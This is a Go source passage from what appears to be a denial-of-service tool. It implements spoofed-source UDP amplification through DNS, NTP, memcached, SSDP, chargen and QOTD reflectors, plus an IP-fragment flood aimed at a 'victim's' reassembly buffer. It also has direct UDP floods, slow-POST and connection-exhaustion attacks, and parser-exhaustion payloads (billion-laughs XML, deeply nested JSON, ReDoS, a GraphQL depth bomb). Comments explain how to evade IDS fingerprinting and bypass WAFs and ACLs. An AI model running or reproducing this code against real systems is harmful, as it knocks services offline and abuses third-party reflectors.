	if len(udpNTPAmplifiers) > 0 {
		effectiveNTP = append([]net.IP(nil), udpNTPAmplifiers...)
	}

	var effectiveMemcached []net.IP
	if len(udpMemcachedAmplifiers) > 0 {
		effectiveMemcached = append([]net.IP(nil), udpMemcachedAmplifiers...)
	}
	var effectiveChargen []net.IP
	if len(udpChargenAmplifiers) > 0 {
		effectiveChargen = append([]net.IP(nil), udpChargenAmplifiers...)
	}
	var effectiveQOTD []net.IP
	if len(udpQOTDAmplifiers) > 0 {
		effectiveQOTD = append([]net.IP(nil), udpQOTDAmplifiers...)
	}

	type protoVec struct {
		payload    []byte
		amplifiers []net.IP // nil = use randomMemcachedProbeIP
		port       uint16
	}
	vectors := make([]protoVec, 0, 6)
	if len(effectiveDNS) > 0 {
		vectors = append(vectors, protoVec{dnsPayload, effectiveDNS, 53})
	}
	if len(effectiveNTP) > 0 {
		vectors = append(vectors, protoVec{ntpPayload, effectiveNTP, 123})
	}
	if useBuiltInReflectors || len(udpMemcachedAmplifiers) > 0 {
		vectors = append(vectors, protoVec{memcachedPayload, effectiveMemcached, 11211})
	}
	if len(udpSSDPAmplifiers) > 0 {
		vectors = append(vectors, protoVec{ssdpPayload, udpSSDPAmplifiers, 1900})
	}
	if len(effectiveChargen) > 0 {
		vectors = append(vectors, protoVec{chargenPayload, effectiveChargen, 19})
	}
	if len(effectiveQOTD) > 0 {
		vectors = append(vectors, protoVec{qotdPayload, effectiveQOTD, 17})
	}
	if len(vectors) == 0 {
		return false
	}

	const (
		reflectGoroutines = 120
		fragGoroutines    = 30
		fragWireBytes     = 1048 // frag1(532 bytes) + frag2(516 bytes) total wire bytes
	)

	var wg sync.WaitGroup

	// reflection/amplification goroutines: each goroutine picks a socket from
	// the pool by index so multiple goroutines share a socket but fewer goroutines
	// contend per socket than if all 120 used a single fd.
	for i := 0; i < reflectGoroutines; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()

			addr := addrs[idx%len(addrs)]
			targetIP := addr.IP.To4()
			if targetIP == nil {
				failedRequests.Add(1)
				return
			}

			fd := sockets[idx%len(sockets)]
			vec := vectors[idx%len(vectors)]
			payloadLen := len(vec.payload)
			pktLen := 20 + 8 + payloadLen
			pkt := make([]byte, pktLen)
			copy(pkt[28:], vec.payload)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := paceLimiter.WaitN(ctx, pktLen); err != nil {
					return
				}

				protocolName := reflectorProtocolName(vec.port)
				ampIP := pickReflectorIP(vec.amplifiers, protocolName)
				if ampIP == nil {
					if vec.amplifiers != nil {
						ampIP = vec.amplifiers[mathrand.Intn(len(vec.amplifiers))]
					} else {
						// memcached: use subnet-targeted random IP from historically
						// high-density ranges rather than fully random global space.
						ampIP = randomMemcachedProbeIP()
					}
				}

				switch vec.port {
				case 53:
					binary.BigEndian.PutUint16(pkt[28:30], uint16(mathrand.Uint32()))
				case 11211:
					binary.BigEndian.PutUint16(pkt[28:30], uint16(mathrand.Uint32()))
				}

				victimPort := uint16(1024 + mathrand.Intn(64511))
				writeIPUDPHeaders(pkt[:pktLen], targetIP, ampIP, victimPort, vec.port, payloadLen)

				dstSA := &syscall.SockaddrInet4{Port: int(vec.port)}
				copy(dstSA.Addr[:], ampIP)

				if err := syscall.Sendto(fd, pkt[:pktLen], 0, dstSA); err != nil {
					recordReflectorObservation(ampIP, protocolName, false, pktLen, 0, err.Error(), false)
					atomic.AddUint64(&udpLocalSendFailures, 1)
					failedRequests.Add(1)
				} else {
					recordReflectorObservation(ampIP, protocolName, true, pktLen, 0, "", false)
					atomic.AddUint64(&udpLocalSendAttempts, 1)
					atomic.AddUint64(&totalBytesSent, uint64(pktLen))
				}
			}
		}(i)
	}

	// fragmented UDP goroutines: send large packets split into two IP fragments
	// directly to the victim with spoofed random source IPs. this attacks the
	// victim's IP reassembly buffer independently of the reflection vectors.
	// the kernel has to hold incomplete fragment chains in memory until the
	// reassembly timer fires. a steady stream of fragments that never complete
	// exhausts the reassembly queue (Linux default: 4MB, ~8000 concurrent chains).
	// this also bypasses stateless ACLs that only inspect fragment 0 for port rules.
	for i := 0; i < fragGoroutines; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()

			addr := addrs[idx%len(addrs)]
			targetIP := addr.IP.To4()
			if targetIP == nil {
				failedRequests.Add(1)
				return
			}

			fd := sockets[idx%len(sockets)]
			payload := make([]byte, 1000)
			_, _ = mathrand.Read(payload)

			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if err := paceLimiter.WaitN(ctx, fragWireBytes); err != nil {
					return
				}
				// re-randomize first 16 bytes to vary each fragment pair enough
				// that the victim can't collapse them into a single reassembly entry.
				_, _ = mathrand.Read(payload[:16])
				srcIP := randomPublicIPv4().To4()
				srcPort := uint16(1024 + mathrand.Intn(64511))
				dstPort := uint16(1024 + mathrand.Intn(64511))
				sendFragmentedIPv4(fd, srcIP, targetIP, srcPort, dstPort, payload)
				atomic.AddUint64(&udpLocalSendAttempts, 1)
				atomic.AddUint64(&totalBytesSent, fragWireBytes)
			}
		}(reflectGoroutines + i)
	}

	wg.Wait()
	return true
}

// udpBpsPayloadBytes is the near-MTU payload size used by the direct flood's
// byte-throughput stream. Kept just under a typical 1500-byte Ethernet MTU so a
// single datagram doesn't fragment.
const udpBpsPayloadBytes = 1400

// directUDPFlood is the direct, non-spoofed flood against the target (also the
// non-privileged fallback for type 10). it splits goroutines into a pps group
// (1-byte packets, max packet rate) and a bps group (near-MTU packets, max byte
// throughput), running both simultaneously so we hit whichever ceiling the target
// is weaker on.
//
// both streams pace through the shared, LIVE UDP egress limiter (paceEgress), so:
//   - -bandwidth sets the TOTAL byte budget, shared correctly even across several
//     concurrent floods (no per-flood multiplication of the cap), and
//   - the adaptive congestion controller can throttle the whole thing in real time
//     when the uplink saturates, instead of the rate being frozen at flood start.
//
// the pps stream additionally holds its OWN packet-rate limiter so the byte stream
// can't starve it of the shared budget; its tiny byte cost still draws from that
// budget, so the two streams together stay within -bandwidth. an old design gave
// each stream a private byte limiter, which both starved the packet stream and
// ignored -bandwidth at flood time.
func directUDPFlood(ctx context.Context, addrs []*net.UDPAddr) {
	const (
		ppsGoroutines   = 60
		bpsGoroutines   = 60
		ppsBatch        = 64 // datagrams per sendmmsg batch on the packet-rate stream
		bpsBatch        = 16 // datagrams per sendmmsg batch on the byte-rate stream
		ppsBurstPackets = 10_000
	)

	// aggregate packet-rate cap across all pps goroutines. configurable via -udp-pps
	// / config (UDPPacketsPerSec); <=0 keeps the built-in 100k default. publish and
	// log it so a tool-imposed ceiling isn't silently misread as the target's pps
	// limit — the dashboard flags it "binding" when the send rate sits at the cap.
	ppsPacketsPerSec := 100_000
	if config.UDPPacketsPerSec > 0 {
		ppsPacketsPerSec = config.UDPPacketsPerSec
	}
	atomic.StoreUint64(&udpPPSCap, uint64(ppsPacketsPerSec))
	if globalLogger != nil {
		logDirectFloodInfo(globalLogger, fmt.Sprintf("UDP direct flood: packet-rate cap %d pkt/s (-udp-pps to change); near-MTU byte stream paced by -bandwidth", ppsPacketsPerSec))
	}

	// caps how much of the shared egress budget the packet stream may take, so the
	// byte stream keeps the rest. for 1-byte packets this is ~100 KB/s at 100k pps.
	pktLimiter := rate.NewLimiter(rate.Limit(ppsPacketsPerSec), ppsBurstPackets)

	var wg sync.WaitGroup

	for i := 0; i < ppsGoroutines; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			addr := addrs[idx%len(addrs)]
			sock, sockErr := net.DialUDP("udp", nil, addr)
			if sockErr != nil {
				failedRequests.Add(1)
				return
			}
			defer sock.Close()
			tiny := []byte{0x00}
			// one sendmmsg per batch (Linux) instead of one sendto per packet, so the
			// pps ceiling we measure is the target's receive rate, not our syscall rate.
			sender := newUDPBatchSender(sock, ppsBatch, tiny)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				// pace the packet rate in batches (one limiter call per 1-byte packet
				// made the limiter itself the bottleneck), then draw the batch's bytes
				// from the shared egress budget so the total still honors -bandwidth.
				if err := pktLimiter.WaitN(ctx, ppsBatch); err != nil {
					return
				}
				if !paceEgress(ctx, ppsBatch*len(tiny)) {
					return
				}
				sent, err := sender.sendN(ppsBatch)
				if sent > 0 {
					atomic.AddUint64(&udpLocalSendAttempts, uint64(sent))
					atomic.AddUint64(&totalBytesSent, uint64(sent*len(tiny)))
				}
				if err != nil {
					atomic.AddUint64(&udpLocalSendFailures, 1)
					failedRequests.Add(1)
				}
			}
		}(i)
	}

	for i := 0; i < bpsGoroutines; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			addr := addrs[idx%len(addrs)]
			sock, sockErr := net.DialUDP("udp", nil, addr)
			if sockErr != nil {
				failedRequests.Add(1)
				return
			}
			defer sock.Close()
			// fill the payload ONCE. the old per-packet re-randomization of the first
			// 8 bytes was anti-dedup cover for an attack; in a plain throughput test
			// it just burns CPU in the hot loop and lowers achievable bps.
			buf := make([]byte, udpBpsPayloadBytes)
			_, _ = mathrand.Read(buf)
			sender := newUDPBatchSender(sock, bpsBatch, buf)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				// the shared live egress limiter IS the byte-throughput cap, so
				// -bandwidth and the adaptive controller both apply here in real time.
				if !paceEgress(ctx, bpsBatch*len(buf)) {
					return
				}
				sent, err := sender.sendN(bpsBatch)
				if sent > 0 {
					atomic.AddUint64(&udpLocalSendAttempts, uint64(sent))
					atomic.AddUint64(&totalBytesSent, uint64(sent*len(buf)))
				}
				if err != nil {
					atomic.AddUint64(&udpLocalSendFailures, 1)
					failedRequests.Add(1)
				}
			}
		}(ppsGoroutines + i)
	}

	wg.Wait()
}

// writeIPUDPHeaders fills the IP and UDP header regions of buf in-place.
// buf must be at least 20+8+payloadLen bytes; the payload region (buf[28:])
// is expected to be pre-populated by the caller — this only writes headers.
//
// macOS with IP_HDRINCL requires ip_len and ip_off in host (little-endian)
// byte order; Linux wants them in network (big-endian) byte order. we handle
// that difference at runtime rather than with build tags.
func writeIPUDPHeaders(buf []byte, srcIP, dstIP net.IP, srcPort, dstPort uint16, payloadLen int) {
	totalLen := uint16(20 + 8 + payloadLen)

	buf[0] = 0x45 // IPv4, IHL=5 (20-byte header, no options)
	buf[1] = 0x00 // DSCP/ECN
	if runtime.GOOS == "darwin" {
		// macOS ip(4): ip_len must be in host byte order when IP_HDRINCL is set
		binary.LittleEndian.PutUint16(buf[2:4], totalLen)
	} else {
		binary.BigEndian.PutUint16(buf[2:4], totalLen)
	}
	binary.BigEndian.PutUint16(buf[4:6], uint16(mathrand.Uint32())) // random ID per packet
	// ip_off: no DF flag so intermediate routers can fragment if needed.
	// darwin requires ip_off in host byte order just like ip_len (see darwin ip(4)).
	if runtime.GOOS == "darwin" {
		binary.LittleEndian.PutUint16(buf[6:8], 0x0000)
	} else {
		binary.BigEndian.PutUint16(buf[6:8], 0x0000)
	}
	// TTL randomized across 48-128 so the stream looks like diverse-source traffic
	// to stateful firewalls and IDS systems that fingerprint by hop count.
	buf[8] = uint8(48 + mathrand.Intn(81))
	buf[9] = 0x11  // protocol: UDP
	buf[10] = 0x00 // checksum placeholder, zeroed before computing below
	buf[11] = 0x00
	copy(buf[12:16], srcIP.To4())
	copy(buf[16:20], dstIP.To4())

	cs := ipv4Checksum(buf[:20])
	binary.BigEndian.PutUint16(buf[10:12], cs)

	// UDP header
	binary.BigEndian.PutUint16(buf[20:22], srcPort)
	binary.BigEndian.PutUint16(buf[22:24], dstPort)
	binary.BigEndian.PutUint16(buf[24:26], uint16(8+payloadLen))
	buf[26] = 0x00 // UDP checksum: 0 = disabled (optional on IPv4)
	buf[27] = 0x00
}

// ipv4Checksum computes the one's complement checksum over a 20-byte IPv4
// header. the checksum field (bytes 10-11) must be zeroed before calling.
func ipv4Checksum(hdr []byte) uint16 {
	var sum uint32
	for i := 0; i < len(hdr); i += 2 {
		sum += uint32(hdr[i])<<8 | uint32(hdr[i+1])
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// randomPublicIPv4 generates a random IPv4 address in a routable public range,
// skipping loopback (127/8), private (10/8, 172.16/12, 192.168/16), multicast
// (224+/4), link-local (169.254/16), and reserved (0/8, 240+/4) blocks.
func reflectorProtocolName(port uint16) string {
	switch port {
	case 53:
		return "dns"
	case 123:
		return "ntp"
	case 11211:
		return "memcached"
	case 1900:
		return "ssdp"
	case 19:
		return "chargen"
	case 17:
		return "qotd"
	default:
		return "udp"
	}
}

func randomPublicIPv4() net.IP {
	ip := make(net.IP, 4)
	for {
		mathrand.Read(ip)
		if ip[0] == 0 || ip[0] == 127 || ip[0] >= 224 {
			continue
		}
		if net.IP(ip).IsPrivate() || net.IP(ip).IsLinkLocalUnicast() {
			continue
		}
		return net.IP{ip[0], ip[1], ip[2], ip[3]}
	}
}

// randomMemcachedProbeIP returns a random IP from subnets historically
// documented as having high concentrations of open memcached instances in the
// 2017-2019 vulnerability research and DDoS incident reports (Akamai/Cloudflare
// 2018 GitHub attack post-mortem, CERT/CC VU#984203). these are /8 blocks with
// documented high open-service density, actual live instances require scanning
// to confirm (Shodan: port:11211 product:memcached).
func randomMemcachedProbeIP() net.IP {
	// china telecom/unicom/mobile (101, 114, 117, 175, 36, 58, 59, 60, 61, 120),
	// russian/eastern-european RIPE blocks (5, 46, 176, 188, 91, 31)
	firstOctets := []byte{5, 31, 36, 46, 58, 59, 60, 61, 91, 101, 114, 117, 120, 175, 176, 188}
	return net.IP{
		firstOctets[mathrand.Intn(len(firstOctets))],
		byte(mathrand.Intn(256)),
		byte(mathrand.Intn(256)),
		byte(1 + mathrand.Intn(254)), // avoid .0 and .255
	}
}

// sendFragmentedIPv4 sends a UDP datagram split into two IP fragments on an
// already-open raw socket. both fragments carry the same IP ID so the victim's
// IP reassembly code tries to reconstruct them, burning per-fragment kernel
// state. this works as a second attack surface alongside reflection: the victim
// has to manage the reassembly queue regardless of whether amplifier responses
// are arriving.
//
// fragment layout:
//
//	frag 1: IP(MF=1, offset=0) + UDP header + first 504 bytes of payload = 532 bytes
//	frag 2: IP(MF=0, offset=64) + remaining 496 bytes                    = 516 bytes
//
// payload must be exactly 1000 bytes. darwin and linux require different byte
// orders for ip_off when IP_HDRINCL is set, handled the same way as ip_len.
func sendFragmentedIPv4(fd int, srcIP, dstIP net.IP, srcPort, dstPort uint16, payload []byte) {
	const (
		frag1PayLen = 504 // UDP header (8) + this = 512 bytes = multiple of 8
		frag2Offset = 64  // 512 / 8 = 64, in 8-byte fragment offset units
	)

	ipID := uint16(mathrand.Uint32())
	ttl := uint8(48 + mathrand.Intn(81))
	totalUDPLen := uint16(8 + len(payload))

	dstSA := &syscall.SockaddrInet4{}
	copy(dstSA.Addr[:], dstIP.To4())

	// fragment 1: carries UDP header and first 504 bytes of the datagram.
	frag1 := make([]byte, 20+8+frag1PayLen)
	frag1[0] = 0x45
	frag1[1] = 0x00
	if runtime.GOOS == "darwin" {
		binary.LittleEndian.PutUint16(frag1[2:4], uint16(20+8+frag1PayLen))
		binary.LittleEndian.PutUint16(frag1[6:8], 0x2000) // MF flag, host byte order
	} else {
		binary.BigEndian.PutUint16(frag1[2:4], uint16(20+8+frag1PayLen))
		binary.BigEndian.PutUint16(frag1[6:8], 0x2000) // MF flag, network byte order
	}
	binary.BigEndian.PutUint16(frag1[4:6], ipID)
	frag1[8] = ttl
	frag1[9] = 0x11
	frag1[10] = 0x00
	frag1[11] = 0x00
	copy(frag1[12:16], srcIP.To4())
	copy(frag1[16:20], dstIP.To4())
	binary.BigEndian.PutUint16(frag1[10:12], ipv4Checksum(frag1[:20]))
	binary.BigEndian.PutUint16(frag1[20:22], srcPort)
	binary.BigEndian.PutUint16(frag1[22:24], dstPort)
	binary.BigEndian.PutUint16(frag1[24:26], totalUDPLen)
	frag1[26] = 0x00
	frag1[27] = 0x00
	copy(frag1[28:], payload[:frag1PayLen])
	syscall.Sendto(fd, frag1, 0, dstSA) //nolint: errcheck

	// fragment 2: carries the remaining 496 bytes, offset = 64 × 8 = 512 bytes.
	frag2Payload := payload[frag1PayLen:]
	frag2 := make([]byte, 20+len(frag2Payload))
	frag2[0] = 0x45
	frag2[1] = 0x00
	if runtime.GOOS == "darwin" {
		binary.LittleEndian.PutUint16(frag2[2:4], uint16(20+len(frag2Payload)))
		binary.LittleEndian.PutUint16(frag2[6:8], frag2Offset) // offset, MF=0
	} else {
		binary.BigEndian.PutUint16(frag2[2:4], uint16(20+len(frag2Payload)))
		binary.BigEndian.PutUint16(frag2[6:8], frag2Offset) // offset, MF=0
	}
	binary.BigEndian.PutUint16(frag2[4:6], ipID) // same ID, victim reassembles as one datagram
	frag2[8] = ttl
	frag2[9] = 0x11
	frag2[10] = 0x00
	frag2[11] = 0x00
	copy(frag2[12:16], srcIP.To4())
	copy(frag2[16:20], dstIP.To4())
	binary.BigEndian.PutUint16(frag2[10:12], ipv4Checksum(frag2[:20]))
	copy(frag2[20:], frag2Payload)
	syscall.Sendto(fd, frag2, 0, dstSA) //nolint: errcheck
}

// parseTargetForUDP extracts host and port from a target string. portExplicit
// is true only when the caller gave an explicit ":port" — callers use it to
// decide whether to spread across multiple ports or respect the one given.
func parseTargetForUDP(target string) (host, port string, portExplicit bool, err error) {
	target = strings.TrimPrefix(target, "udp://")
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")

	if strings.Contains(target, "/") {
		target = strings.Split(target, "/")[0]
	}

	if strings.Contains(target, ":") {
		host, port, err = net.SplitHostPort(target)
		if err != nil {
			return "", "", false, fmt.Errorf("invalid target format: %v", err)
		}
		portExplicit = true
	} else {
		host = target
		port = "80"
		portExplicit = false
	}

	if net.ParseIP(host) == nil {
		_, err = net.LookupHost(host)
		if err != nil {
			return "", "", false, fmt.Errorf("cannot resolve hostname: %v", err)
		}
	}

	return host, port, portExplicit, nil
}

// protocolExploitAttack (type 6) — slow POST body. we announce a 2GB
// Content-Length then trickle one byte every 5 seconds. the server keeps the
// request in its read buffer waiting for a body that never fully arrives, tying
// up one server thread on HTTP/1.1 or one h2 stream slot. unlike slowloris
// (which stalls on header parsing), this stalls after headers are fully received,
// so it bypasses WAFs that only timeout on partial-header connections.
func protocolExploitAttack(ctx context.Context, target string) {
	parsed, err := url.Parse(target)
	if err != nil {
		failedRequests.Add(1)
		return
	}

	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	path := parsed.RequestURI()
	if path == "" {
		path = "/"
	}

	var conn net.Conn
	if parsed.Scheme == "https" {
		tlsConn, tlsErr := tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"http/1.1"},
		})
		if tlsErr != nil {
			failedRequests.Add(1)
			return
		}
		conn = tlsConn
	} else {
		conn, err = net.DialTimeout("tcp", host, 10*time.Second)
		if err != nil {
			failedRequests.Add(1)
			return
		}
	}
	defer conn.Close()

	// gauge the held connection so the dashboard can show type 6's live count
	atomic.AddUint64(&protocolExploitActive, 1)
	defer atomic.AddUint64(&protocolExploitActive, ^uint64(0))

	// advertise a 2GB body; the server opens a read goroutine/thread and blocks
	header := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 2147483647\r\n\r\n",
		path, parsed.Hostname(),
	)
	if _, werr := conn.Write([]byte(header)); werr != nil {
		failedRequests.Add(1)
		return
	}
	atomic.AddUint64(&totalConnections, 1)
	atomic.AddUint64(&totalBytesSent, uint64(len(header)))

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	bytesSent := len(header)
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			n, writeErr := conn.Write([]byte("a"))
			if writeErr != nil {
				return
			}
			bytesSent += n
			atomic.AddUint64(&totalBytesSent, uint64(n))

			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(bytesSent)
			lastResponseSize = 0
			lastResponseCode = 0
			lastRequestProto = "PROTO-EXPLOIT"
			requestTrackingMux.Unlock()
		}
	}
}

// connectionExhaustionAttack (type 8) — completes a TCP/TLS handshake then
// sends nothing. the server's accepted-socket goroutine blocks waiting for the
// first byte of an HTTP request that never arrives. each worker call adds one
// silent held connection; stacking thousands of them across workers depletes the
// server's file descriptor table and OS TCP socket buffer pool. unlike slowloris
// this sends zero post-handshake bytes, so there is no header drip to detect.
func connectionExhaustionAttack(ctx context.Context, target string) {
	parsed, err := url.Parse(target)
	if err != nil {
		failedRequests.Add(1)
		return
	}

	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	var conn net.Conn
	if parsed.Scheme == "https" {
		tlsConn, tlsErr := tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"http/1.1"},
		})
		if tlsErr != nil {
			failedRequests.Add(1)
			return
		}
		conn = tlsConn
	} else {
		conn, err = net.DialTimeout("tcp", host, 10*time.Second)
		if err != nil {
			failedRequests.Add(1)
			return
		}
	}
	defer conn.Close()

	atomic.AddUint64(&totalConnections, 1)
	atomic.AddUint64(&successfulHits, 1)

	// gauge the held connection so the dashboard can show type 8's live count
	atomic.AddUint64(&connExhaustActive, 1)
	defer atomic.AddUint64(&connExhaustActive, ^uint64(0))

	requestTrackingMux.Lock()
	lastRequestURL = target
	lastRequestSize = 0
	lastResponseSize = 0
	lastResponseCode = 0
	lastRequestProto = "CONN-EXHAUST"
	requestTrackingMux.Unlock()

	// hold the connection open until the server's idle timeout closes it or
	// our ctx is cancelled (graceful shutdown or duration reached)
	<-ctx.Done()
}

// resourceExhaustionAttack (type 9) — sends payloads designed to maximize
// server-side CPU and memory consumption per request rather than raw network
// volume. each variant targets a different parsing pathway so the server has to
// do real work processing the body, not just receive bytes.
func resourceExhaustionAttack(target string, client *http.Client) {
	var wg sync.WaitGroup
	for i := 0; i < 30; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			body, contentType, label := resourceExhaustPayload()
			req, err := http.NewRequest("POST", target, strings.NewReader(body))
			if err != nil {
				failedRequests.Add(1)
				return
			}
			req.Header.Set("Content-Type", contentType)
			req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])
			req.Header.Set("Accept", "application/json, text/plain, */*")

			startTime := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(startTime)
			if err != nil {
				failedRequests.Add(1)
				demonStats.record(RESOURCE_EXHAUSTION, elapsed.Milliseconds(), false)
				return
			}
			defer resp.Body.Close()
			responseData, _ := io.ReadAll(resp.Body)
			requestBytes := calculateRequestSize(req)
			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))

			// burn signal: a response slow enough to clear the threshold is the only
			// externally observable hint that the payload actually cost the server
			// work (deep recursion, entity expansion, regex backtracking) rather than
			// being parsed cheaply or rejected.
			atomic.AddUint64(&resourceCompleted, 1)
			if elapsed.Milliseconds() >= resourceBurnThresholdMs {
				atomic.AddUint64(&resourceBurnHits, 1)
			}

			// 4xx = the payload was rejected (size/validation), not a real hit; 5xx
			// often means we induced a server-side error, which counts as impact.
			success := resp.StatusCode < 400 || resp.StatusCode >= 500
			if success {
				atomic.AddUint64(&successfulHits, 1)
			} else {
				failedRequests.Add(1)
			}
			demonStats.record(RESOURCE_EXHAUSTION, elapsed.Milliseconds(), success)

			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(requestBytes)
			lastResponseSize = uint64(len(responseData))
			lastResponseCode = uint64(resp.StatusCode)
			lastRequestProto = "RSRC:" + label // which payload variant was in flight
			requestTrackingMux.Unlock()
		}()
	}
	wg.Wait()
}

// resourceExhaustPayload returns one of four payloads each targeting a different
// server-side parser. the idea is to burn server CPU on parsing rather than on
// network I/O — per-request CPU cost is much harder to rate-limit than bytes.
func resourceExhaustPayload() (body, contentType, label string) {
	switch mathrand.Intn(4) {
	case 0:
		// XML entity expansion (billion-laughs structure, bounded depth) —
		// parsers without entity expansion limits resolve this recursively.
		// four levels of &d; expands to 10^4 = 10,000 repetitions of "AAAAAAAAAA".
		return `<?xml version="1.0"?><!DOCTYPE x [` +
			`<!ENTITY a "AAAAAAAAAA">` +
			`<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">` +
			`<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">` +
			`<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">` +
			`]><r>&d;</r>`, "application/xml", "xml"
	case 1:
		// deeply nested JSON object — forces recursive descent parsing to
		// stack depth 5000. parsers with no depth limit allocate one stack
		// frame per level; Go's encoding/json will return an error at ~1000.
		depth := 5000
		return strings.Repeat(`{"x":`, depth) + `"v"` + strings.Repeat("}", depth),
			"application/json", "json-deep"
	case 2:
		// ReDoS bait — search/filter endpoints often run input through regex
		// validators. patterns like (a+)+ exhibit catastrophic backtracking
		// on inputs that almost match. the trailing "!" forces max backtrack.
		return "q=" + strings.Repeat("a", 8000) + "!",
			"application/x-www-form-urlencoded", "redos"
	default:
		// GraphQL introspection depth bomb — if the target exposes /graphql,
		// deeply nested __schema queries force recursive schema graph traversal.
		return `{"query":"{__schema{types{fields{type{fields{type{fields{type{name}}}}}}}}}}"}`,
			"application/json", "graphql"
	}
}
